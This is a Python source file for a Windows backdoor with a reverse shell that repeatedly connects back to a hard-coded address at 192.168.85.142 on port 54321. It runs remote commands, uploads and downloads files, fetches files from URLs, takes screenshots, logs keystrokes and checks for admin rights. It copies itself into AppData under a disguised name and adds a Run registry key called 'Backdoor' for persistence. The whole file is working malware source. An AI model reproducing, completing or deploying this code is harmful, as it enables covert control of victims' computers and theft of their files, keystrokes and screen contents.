#!/usr/bin/python
import socket
import subprocess
import json
import os
import base64
import shutil
import sys
import time
import requests
from mss import mss
import threading
import keylogger


#send more than 1024
def reliable_send(data):
        json_data = json.dumps(data)
        sock.send(json_data)
def reliable_recv():
        data = ""
        while True:
                try:
                        data = data + sock.recv(1024)
                        return json.loads(data)
                except ValueError:
                        continue

def is_admin():
	global admin
	try:
		temp = os.listdir(os.sep.join([os.environ.get('SystemRoot', 'C:\windows'),'temp']))
	except:
		admin = "Failed to get admin"
	else:
		admin = "Admin Priviledges"
def screenshot():
	with mss() as screenshot:
		screenshot.shot()


def download(url):
	get_response = requests.get(url)
	file_name = url.split("/")[-1]
	with open(file_name, "wb") as out_file:
		out_file.write(get_response.content)


#recursive function to spawn connection every 20 seconds
def connection():
	while True:
		time.sleep(20)
		try:
			sock.connect(("192.168.85.142", 54321))
			shell()
		except:
			connection()


def shell():
	while True:
		command = reliable_recv()
		if command =='q':
			break
		elif command =="help":
			help_options = '''					download path --> Download a file from Target PC
					upload path	--> Uload A File To Target PC
					get url		--> Download a File to Target  PC From Any Webiste
					start path	--> Start a program on target PC
					Screenshot 	--> Take a Screenshot of Targets
					Check		--> Check for Admin Privileges
					q 		--> Exit Reverse Shell'''
			reliable_send(help_options)
		elif command[:2]=="cd" and len(command) > 1:
			try:
				os.chdir(command[3:])
			except:
				continue
		elif command[:8] =="download":
                	with open(command[9:], "rb") as file:
				reliable_send(base64.b64encode(file.read()))
                elif command[:6] == "upload":
                	with open(command[7:], "wb") as fin:
					file_data=reliable_recv()
					fin.write(base64.b64decode(file_data))
		elif command[:3] == "get":
			try:
				download(command[4:])
				reliable_send("Download file from specificed URL")
			except:
				reliable_send("Failed to download file")
		elif command[:5] =="check":
			try:
				is_admin()
				reliable_send(admin)
			except:
				reliable_send("Cant Perform the Check")
		elif command[:10] == "screenshot":
			try:
				screenshot()
				with open("monitor-1.png","rb") as sc:
					reliable_send(base64.b64encode(sc.read()))
				os.remove("monitor-1.png")
			except:
				reliable_send("Failed to Take Screenshot")
		elif command[:5] =="start":
			try:
				subprocess.Popen(command[6:], shell=True)
				reliable_send("Started Program")
			except:
				reliable_send("Failed to Start")
		elif command[:12] == "keylog_start":
			#run new thread
			t1=threading.Thread(target=keylogger.start)
			#start thread
			t1.start()
		elif command[:11] =="keylog_dump":
			fn = open(keylogger_path, "r")
			reliable_send(fn.read())
		else:
			proc = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)

			result = proc.stdout.read() + proc.stderr.read() 
			reliable_send(result)


#copy file to app data
keylogger_path = os.environ["appdata"] + "\\JoshGotHacked.txt"
location = os.environ["appdata"] + "\\windows32Josh.exe"
if not os.path.exists(location):
	shutil.copyfile(sys.executable, location)
	#persistance
	subprocess.call('reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v Backdoor /t REG_SZ /d "' + location + '"',shell=True)
#connect back to me
sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
#sock.connect(("192.168.85.142", 54321))
connection()
#shell()
sock.close()
